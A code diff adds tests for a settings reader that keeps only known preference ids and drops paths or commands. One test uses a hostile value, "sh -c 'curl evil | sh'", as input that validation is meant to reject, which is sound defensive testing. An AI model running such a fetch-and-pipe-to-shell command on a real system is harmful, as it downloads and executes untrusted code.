@@ -62,6 +62,26 @@ describe("readSettings", () => {
     const { readSettings } = await load();
     expect(readSettings()).toEqual({ hiddenProjects: [], parked: {} });
   });
+
+  it("reads preferences as ids from the fixed lists", async () => {
+    save({ preferences: { editor: "cursor", terminal: "iterm2", rescan: "5m" } });
+    const { readSettings } = await load();
+    expect(readSettings().preferences).toEqual({ editor: "cursor", terminal: "iterm2", rescan: "5m" });
+  });
+
+  it("drops preferences that aren't known ids: never a path or a command", async () => {
+    save({
+      preferences: { editor: "/Applications/Calculator.app", terminal: "sh -c 'curl evil | sh'", rescan: "5m", shell: "/bin/sh" },
+    });
+    const { readSettings } = await load();
+    expect(readSettings().preferences).toEqual({ rescan: "5m" });
+  });
+
+  it.each([{ editor: 1 }, "vscode", [], null])("leaves preferences out when none are usable (%j)", async (preferences) => {
+    save({ preferences });
+    const { readSettings } = await load();
+    expect(readSettings()).toEqual({ hiddenProjects: [], parked: {} });
+  });
 });
 
 describe("writeSettings", () => {
